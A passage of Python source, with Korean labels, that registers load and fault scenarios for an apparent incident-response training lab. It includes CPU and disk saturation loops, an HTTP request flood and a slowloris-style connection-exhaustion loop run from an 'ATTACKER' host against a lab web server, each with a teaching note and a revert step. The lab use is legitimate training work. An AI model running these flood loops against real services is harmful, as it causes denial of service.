    teaches="부하 → 발열 → 온도의 연결. 3F 에 걸면 B 아일 온도가 진짜로 오른다.",
    scenarios=["INC-01", "GPU-03"], targets=SHELL_OK, ttl=900,
    params=[{"name": "workers", "label": "워커 수", "type": "int", "default": 2}],
    apply=lambda t, p, h: sh_bg(t, "for i in $(seq 1 %d); do (while :; do "
        "openssl speed -seconds 1 rsa2048 >/dev/null 2>&1 || :; done) & done; wait"
        % int(p.get("workers", 2)), h),
    revert=lambda t, pl: kill_bg(t, pl["_h"], "openssl"))

async def _loadio_off(t, pl):
    await kill_bg(t, pl["_h"], "dd if=/dev/zero")
    await dk.sh(t, "rm -f /var/tmp/kt66-io-*; true")

reg(id="load_io", domain="load", name="디스크 IO 부하", danger=2, kind="state",
    desc="쓰기와 sync 를 반복해 IO 를 포화시킨다.",
    teaches="IO 대기와 CPU 부하를 구분하는 법. 둘 다 '느리다'로 보인다.",
    scenarios=["INC-07"], targets=DISK_TARGETS, ttl=900,
    apply=lambda t, p, h: sh_bg(t, f"while :; do dd if=/dev/zero of=/var/tmp/kt66-io-{h} "
                                   f"bs=1M count=64 conv=fsync 2>/dev/null; done", h),
    revert=_loadio_off)


reg(id="load_http", domain="load", name="HTTP 요청 폭주", danger=2, kind="state",
    desc="웹 진입점에 동시 요청을 몰아친다. 체인 전체(fw→ips→web→앱)에 부하가 걸린다.",
    teaches="어느 계층이 먼저 무너지는가. 병목은 대개 맨 앞이 아니다.",
    scenarios=["INC-01", "SEC-03"], targets=[ATTACKER], ttl=600,
    params=[{"name": "conc", "label": "동시성", "type": "int", "default": 30},
            {"name": "url", "label": "대상", "type": "str", "default": f"http://{WEB}:8001/"}],
    apply=lambda t, p, h: sh_bg(t, f"while :; do ab -n 2000 -c {int(p.get('conc', 30))} "
                                   f"-q {p.get('url')} >/dev/null 2>&1 || "
                                   f"curl -s -m 5 {p.get('url')} >/dev/null; done", h),
    revert=lambda t, pl: kill_bg(t, pl["_h"], "ab -n", "curl -s -m 5"))

reg(id="load_slow_backend", domain="load", name="백엔드 지연 전파", danger=2, kind="state",
    desc="WAF 뒤 백엔드 구간에만 지연을 건다. 앞단은 멀쩡한데 응답만 느리다.",
    teaches="계층별 절단의 정석. WAF·앱·백엔드 중 어디인지 배제해 나가는 훈련.",
    scenarios=["INC-01"], targets=["kt66-web"], ttl=600,
    params=[{"name": "ms", "label": "지연(ms)", "type": "int", "default": 800}],
    apply=lambda t, p, h: dk.sh(t, f"tc qdisc del dev eth1 root 2>/dev/null; "
                                   f"tc qdisc add dev eth1 root netem "
                                   f"delay {int(p.get('ms', 800))}ms"),
    revert=lambda t, pl: dk.sh(t, "tc qdisc del dev eth1 root 2>/dev/null; true"))

reg(id="load_inference", domain="load", name="추론 부하 (DGX)", danger=2, kind="state",
    desc="터널 너머 DGX Spark 에 동시 추론 요청을 건다. **GPU 온도와 클럭이 실제로 움직인다.**",
    teaches="TTFT 를 수치로 재고, 자원 부족인지 설정 문제인지 가르는 법. "
            "온도가 오르면 SM 클럭이 진짜로 떨어진다 — 열 스로틀이 시뮬레이션이 아니다.",
    scenarios=["INC-04", "GPU-03", "GPU-05"], targets=[ATTACKER, "kt66-bastion"], ttl=900,
    params=[{"name": "conc", "label": "동시 요청", "type": "int", "default": 4}],
    apply=lambda t, p, h: sh_bg(t, "for i in $(seq 1 %d); do (while :; do curl -s -m 120 "
        "http://%s:11434/api/generate -d "
        "'{\"model\":\"gemma4:31b\",\"prompt\":\"Explain datacenter cooling in detail.\"}' "
        ">/dev/null; done) & done; wait" % (int(p.get("conc", 4)), DGX), h),
    revert=lambda t, pl: kill_bg(t, pl["_h"], "curl -s -m"))

reg(id="load_conn_exhaust", domain="load", name="커넥션 고갈", danger=2, kind="state",
    desc="연결만 열어 두고 요청을 보내지 않는다(slowloris 형). 커넥션 슬롯이 마른다.",
    teaches="CPU 도 대역도 여유로운데 서비스가 안 되는 경우. 자원은 CPU 만이 아니다.",
    scenarios=["INC-01", "SEC-03"], targets=[ATTACKER], ttl=600,
    params=[{"name": "conns", "label": "커넥션 수", "type": "int", "default": 200}],
    apply=lambda t, p, h: sh_bg(t, "for i in $(seq 1 %d); do (ncat -w 600 %s 8001 </dev/null) & "
        "done; wait" % (int(p.get("conns", 200)), WEB), h),
    revert=lambda t, pl: kill_bg(t, pl["_h"], "ncat -"))


BY_ID = {i.id: i for i in C}
DOMAINS = {
    "system":   {"name": "시스템 · 프로세스", "color": "#38bdf8"},
    "storage":  {"name": "스토리지 · 디스크", "color": "#fbbf24"},
    "network":  {"name": "네트워크",          "color": "#a78bfa"},
    "security": {"name": "보안",              "color": "#ff4d6a"},
    "load":     {"name": "부하 · 성능",       "color": "#3ddc97"},
}
